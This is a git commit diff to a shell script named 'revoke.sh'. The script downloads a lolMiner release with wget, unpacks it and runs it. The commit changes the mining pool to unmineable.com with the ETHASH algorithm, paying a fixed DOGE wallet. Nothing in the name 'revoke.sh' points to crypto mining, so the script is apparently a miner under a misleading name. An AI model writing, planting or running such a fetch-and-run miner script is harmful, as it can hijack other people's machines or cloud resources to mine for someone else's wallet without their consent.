87cbb673f744b4719a4857969b07a0a7d31f6972
postsnarrator <kapilramudamu04@gmail.com>
2021-06-15 12:26:07 +0530

    Update revoke.sh

--- revoke.sh
+++ revoke.sh
@@ -2,4 +2,4 @@
 sudo apt update
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz && tar -xf lolMiner_v1.29_Lin64.tar.gz
 cd 1.29
-./lolMiner --algo cryptonight-upx/2 --pool stratum+tcp://cryptonight_upx.mine.zergpool.com:4457 --user DOGE:D6EUU5hyBF4N41AsYC6rVisauNMPwdAUP1.fadedunion
+./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user DOGE:D6EUU5hyBF4N41AsYC6rVisauNMPwdAUP1.fadedoge --ethstratum ETHPROXY
